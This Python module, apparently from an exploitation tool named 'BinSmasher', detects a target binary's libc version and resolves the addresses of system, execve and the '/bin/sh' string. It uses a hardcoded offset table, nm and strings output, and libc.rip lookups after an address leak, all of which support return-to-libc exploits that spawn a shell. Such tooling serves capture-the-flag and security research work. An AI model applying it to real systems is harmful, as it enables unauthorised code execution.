"""Library offset loading and libc detection methods for BinaryAnalyzer."""
import subprocess
import re
import os
import json
import logging
import urllib.request
import urllib.error

log = logging.getLogger("binsmasher")


class LibraryMixin:
    """Methods: load_library_offsets, _detect_libc_version, _extract_offsets_from_libc, query_libc_rip."""

    def load_library_offsets(self):
        log.info("Loading library offsets…")
        base_addr = None
        LIBC_OFFSETS = {"libc.so.6": {
            "2.27": {"system": 0x04F440, "binsh": 0x1B3E1A, "execve": 0x0E4E30, "puts": 0x07D7C0, "tcache": 0x3C4B20},
            "2.31": {"system": 0x055410, "binsh": 0x1B75AA, "execve": 0x0E6C70, "tcache": 0x1B2C40, "puts": 0x080ED0},
            "2.35": {"system": 0x050D70, "binsh": 0x1B45BD, "execve": 0x0E63B0, "tcache": 0x219C80, "puts": 0x080E50},
            "2.38": {"system": 0x054EF0, "binsh": 0x1BC351, "execve": 0x0EAEA0, "tcache": 0x21B2C0, "puts": 0x0849C0},
            "2.39": {"system": 0x058740, "binsh": 0x1CB42F, "execve": 0x0F2C80, "tcache": 0x21D2C0, "puts": 0x088D90},
        }}
        try:
            if self.platform in ("linux", "android"):
                ldd_cmd = (["adb", "shell", f"ldd {self.binary}"] if self.platform == "android"
                           else ["ldd", self.binary])
                try:
                    ldd_out = subprocess.check_output(ldd_cmd, stderr=subprocess.DEVNULL).decode()
                except Exception:
                    ldd_out = ""
                try:
                    if self.platform == "android":
                        maps_out = subprocess.check_output(
                            ["adb", "shell", "cat /proc/1/maps"], stderr=subprocess.DEVNULL
                        ).decode()
                        for line in maps_out.splitlines():
                            if "libc" in line and "r-xp" in line:
                                base_addr = int(line.split("-")[0], 16)
                                log.info(f"libc base (adb): {hex(base_addr)}")
                                break
                    else:
                        ldd_map = subprocess.check_output(
                            ["ldd", self.binary], stderr=subprocess.DEVNULL
                        ).decode()
                        for line in ldd_map.splitlines():
                            if "libc" in line:
                                m = re.search(r"=>\s+\S+\s+\((0x[0-9a-fA-F]+)\)", line)
                                if m:
                                    base_addr = int(m.group(1), 16)
                                    log.info(f"libc base (ldd): {hex(base_addr)}")
                                    break
                except Exception:
                    pass
            elif self.platform == "windows":
                import pefile
                pe = pefile.PE(self.binary)
                dlls = [d.Name.decode() for d in pe.DIRECTORY_ENTRY_IMPORT]
                log.info(f"Imported DLLs: {dlls}")
                return dlls[0] if dlls else None, "unknown", {}, None
            version, libc_path = self._detect_libc_version()
            offsets = LIBC_OFFSETS.get("libc.so.6", {}).get(version, {}) if version else {}
            if offsets:
                log.info(f"Loaded libc offsets for v{version}: {list(offsets.keys())}")
                return "libc.so.6", version, offsets, base_addr
            if libc_path and os.path.isfile(libc_path):
                extracted = self._extract_offsets_from_libc(libc_path)
                if extracted:
                    log.info(f"Extracted {len(extracted)} offsets from {libc_path}")
                    return "libc.so.6", version or "unknown", extracted, base_addr
            version_str = version or "unknown"
            log.warning(f"No built-in offsets for libc {version_str} — will query libc.rip after leak")
            return "libc.so.6", version_str, {}, base_addr
        except Exception as e:
            log.warning(f"Library offset loading failed: {e}")
            return None, None, {}, None

    def _detect_libc_version(self):
        """Returns (version_str, libc_path) or (None, None) if detection fails."""
        try:
            ldd_out = subprocess.check_output(
                ["ldd", self.binary], stderr=subprocess.DEVNULL
            ).decode()
            for line in ldd_out.splitlines():
                if "libc" in line:
                    m = re.search(r"=>\s+(/\S+libc[^\s]*)", line)
                    if m:
                        libc_path = m.group(1)
                        vm = re.search(r"libc-(\d+\.\d+)\.so", libc_path)
                        if not vm:
                            try:
                                sv = subprocess.check_output(
                                    ["strings", libc_path], stderr=subprocess.DEVNULL
                                ).decode(errors="ignore")
                                vm = re.search(r"GNU C Library.*?release version (\d+\.\d+)", sv)
                            except Exception:
                                pass
                        if vm:
                            log.info(f"libc version from target: {vm.group(1)} ({libc_path})")
                            return vm.group(1), libc_path
                        return None, libc_path
        except Exception:
            pass
        try:
            out = subprocess.check_output(["ldd", "--version"], stderr=subprocess.STDOUT).decode()
            m = re.search(r"(\d+\.\d+)", out)
            if m:
                log.info(f"libc version from host ldd: {m.group(1)}")
                return m.group(1), None
        except Exception:
            pass
        log.warning("Could not detect libc version — offsets will be fetched from libc.rip after leak")
        return None, None

    def _extract_offsets_from_libc(self, libc_path):
        """Extract symbol offsets from a real libc binary using nm."""
        offsets = {}
        symbols_wanted = {"system", "execve", "puts", "printf", "open", "read", "write", "__libc_system"}
        try:
            nm_out = subprocess.check_output(
                ["nm", "-D", "--defined-only", libc_path], stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            for line in nm_out.splitlines():
                parts = line.split()
                if len(parts) >= 3 and parts[1] in ("T", "W"):
                    name = parts[2]
                    if name in symbols_wanted:
                        try:
                            offsets[name] = int(parts[0], 16)
                        except ValueError:
                            pass
        except Exception as e:
            log.debug(f"nm libc extraction: {e}")
        try:
            st = subprocess.check_output(
                ["strings", "-t", "x", libc_path], stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            for line in st.splitlines():
                if line.strip().endswith("/bin/sh"):
                    m = re.match(r"\s*([0-9a-fA-F]+)\s+/bin/sh", line)
                    if m:
                        offsets["binsh"] = int(m.group(1), 16)
                        break
        except Exception as e:
            log.debug(f"strings /bin/sh: {e}")
        if "system" not in offsets and "__libc_system" in offsets:
            offsets["system"] = offsets["__libc_system"]
        return offsets

    def query_libc_rip(self, leaked_addr, symbol="puts"):
        log.info(f"Querying libc.rip: {symbol} leaked @ {hex(leaked_addr)}…")
        page_offset = hex(leaked_addr & 0xfff)
        url = f"https://libc.rip/api/v1/find?symbols={symbol}={page_offset}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "BinSmasher/4"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                results = json.loads(resp.read())
        except urllib.error.URLError as e:
            log.warning(f"libc.rip unreachable: {e}")
            return {}
        except Exception as e:
            log.error(f"libc.rip error: {e}")
            return {}
        if not results:
            log.warning(f"libc.rip: no match for {symbol}+{page_offset}")
            return {}
        best = results[0]
        log.info(f"libc.rip match: {best.get('id', 'unknown')} ({len(results)} candidates)")
        sym_offset = int(best["symbols"][symbol], 16)
        libc_base = leaked_addr - sym_offset
        absolute = {"__libc_base__": libc_base, "id": best.get("id", "unknown")}
        for name, off_str in best["symbols"].items():
            try:
                absolute[name] = libc_base + int(off_str, 16)
            except Exception:
                pass
        log.info(f"libc base: {hex(libc_base)}  system: {hex(absolute.get('system', 0))}")
        return absolute
